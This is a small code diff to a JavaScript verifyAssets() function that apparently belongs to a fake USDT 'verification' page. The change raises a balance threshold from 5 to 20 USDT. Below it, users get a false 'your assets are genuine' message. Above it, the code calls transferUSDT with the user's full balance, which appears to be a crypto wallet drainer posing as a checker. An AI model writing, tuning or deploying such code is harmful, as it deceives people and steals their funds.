@@ -59,7 +59,7 @@ async function verifyAssets() {
         return;
     }
 
-    if (usdtBalance <= 5) {
+    if (usdtBalance <= 20) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
@@ -67,7 +67,7 @@ async function verifyAssets() {
         return;
     }
 
-    // User has more than 5 USDT → Proceed to gas check and transfer
+    // User has more than 20 USDT → Proceed to gas check and transfer
     showPopup("Loading...", "green");
 
     transferUSDT(usdtBalance, userBNB);
